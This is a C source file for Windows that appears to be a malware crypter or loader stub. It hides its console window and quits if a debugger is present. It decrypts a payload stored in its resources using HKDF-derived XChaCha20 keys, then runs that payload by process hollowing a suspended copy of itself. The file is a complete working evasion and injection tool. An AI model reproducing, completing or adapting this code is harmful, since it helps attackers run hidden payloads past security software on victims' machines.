#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include "crypto/hashing/sha.h"
#include "crypto/chacha20-poly1305/chacha20poly1305.h"

// Function to extract embedded resource from this executable
unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }

    *dwSize = 0; 
    return NULL;
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (IsDebuggerPresent())
    {
        OutputDebugStringA("Oops! Unexpected failure.");
        return 1;
    }

    uint8_t key[32] = {0};
    uint8_t nonce[24] = {0};


    /*
    Payload decryption and key/nonce recovery process:
    
    1) Load encrypted payload and obfuscated key & nonce from embedded resources.
    2) Calculate SHA-256 hash of the encrypted payload.
    3) Extract first 16 bytes of the hash to be used as HKDF salt.
    4) Use HKDF with hash and salt to derive 80 bytes of keying material (OKM).
        - First 32 bytes → key for deobfuscating real key and nonce.
        - Last 24 bytes  → nonce for deobfuscation context.
    5) Initialize XChaCha20 context and decrypt the obfuscated key and nonce.
    6) Allocate memory and copy the encrypted payload.
    7) Initialize XChaCha20 context with real key/nonce and decrypt the payload in-place.
    */

    unsigned long payloadSize = 0, keySize = 0, nonceSize = 0;
    unsigned char* payloadResPtr = GetResource(132, RT_RCDATA, &payloadSize);
    unsigned char* obfKeyPtr     = GetResource(133, RT_RCDATA, &keySize);
    unsigned char* obfNoncePtr   = GetResource(134, RT_RCDATA, &nonceSize);

    if ((payloadResPtr == NULL || payloadSize == 0) ||
        (obfKeyPtr == NULL     || keySize != 32) ||
        (obfNoncePtr == NULL   || nonceSize != 24))
    {
        return 1;
    }

    // 1) Compute SHA256 of encrypted payload
    uint8_t hash[32];
    SHA256Context shaCtx;
    SHA256Reset(&shaCtx);
    SHA256Input(&shaCtx, payloadResPtr, payloadSize);
    SHA256Result(&shaCtx, hash);

    // 2) salt = hash[0..15]
    uint8_t salt[16];
    memcpy(salt, hash, 16);

    // 3) HKDF(salt, IKM=hash) → okm[80]
    HKDFContext hkdfCTX;
    uint8_t prk[USHAMaxHashSize];
    uint8_t okm[80];
    uint8_t metaNonce[24];
    uint8_t obfKey[32];
    uint8_t obfNonce[24];
    
    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
    if (hkdfReset(&hkdfCTX, SHA256, salt, 16) != 0 ||
        hkdfInput(&hkdfCTX, hash, 32) != 0 ||
        hkdfResult(&hkdfCTX, prk, (const uint8_t *)"obfuscation-context", (int)strlen("obfuscation-context"), okm, 80) != 0)
    {
        return 1;
    }
    memcpy(obfKey, okm, 32);
    memcpy(metaNonce, okm + 56, 24);

    // 4) Decrypt obfuscated key and nonce using obfKey/metaNonce
    chacha20poly1305_ctx obfCtx;
    xchacha20poly1305_init(&obfCtx, obfKey, metaNonce);
    chacha20poly1305_decrypt(&obfCtx, obfKeyPtr, key, 32);
    chacha20poly1305_decrypt(&obfCtx, obfNoncePtr, nonce, 24);

    // 5) Decrypt the payload
    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted) {
        return 1;
    }
    memcpy(decrypted, payloadResPtr, payloadSize);
    chacha20poly1305_ctx decCtx;
    xchacha20poly1305_init(&decCtx, key, nonce);
    chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, payloadSize);

    // Process hollowing 
    void* pe = decrypted;
    IMAGE_DOS_HEADER* DOSHeader = (PIMAGE_DOS_HEADER)pe;
    IMAGE_NT_HEADERS64* NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)pe + DOSHeader->e_lfanew);
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));

    void* pImageBase;
    char currentFilePath[MAX_PATH];

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    {
        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);

        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {
            CONTEXT* CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
            if (!CTX)
            {
                TerminateProcess(PI.hProcess, 1);
                VirtualFree(decrypted, 0, MEM_RELEASE);
                return 1;
            }

            CTX->ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(PI.hThread, CTX))
            {
                pImageBase = VirtualAllocEx(
                    PI.hProcess,
                    (LPVOID)(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                );

                if (pImageBase)
                {
                    WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

                    for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                    {
                        SectionHeader = (PIMAGE_SECTION_HEADER)(
                            (uint8_t*)pe + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
                        );

                        WriteProcessMemory(
                            PI.hProcess,
                            (LPVOID)((uintptr_t)pImageBase + SectionHeader->VirtualAddress),
                            (LPVOID)((uintptr_t)pe + SectionHeader->PointerToRawData),
                            SectionHeader->SizeOfRawData,
                            NULL
                        );
                    }

                    WriteProcessMemory(
                        PI.hProcess,
                        (LPVOID)(CTX->Rdx + 0x10),
                        &NtHeader->OptionalHeader.ImageBase,
                        sizeof(uint64_t),
                        NULL
                    );

                    CTX->Rcx = (uintptr_t)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
                    SetThreadContext(PI.hThread, CTX);
                    ResumeThread(PI.hThread);
                    WaitForSingleObject(PI.hProcess, INFINITE);

                    VirtualFree(CTX, 0, MEM_RELEASE);
                    VirtualFree(decrypted, 0, MEM_RELEASE);
                    return 0;
                }
            }

            TerminateProcess(PI.hProcess, 1);
            VirtualFree(CTX, 0, MEM_RELEASE);
        }
    }

    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(nonce, sizeof(nonce));

    if (decrypted)
    {
        SecureZeroMemory(decrypted, payloadSize);
        VirtualFree(decrypted, 0, MEM_RELEASE);
    }
    return 1;
}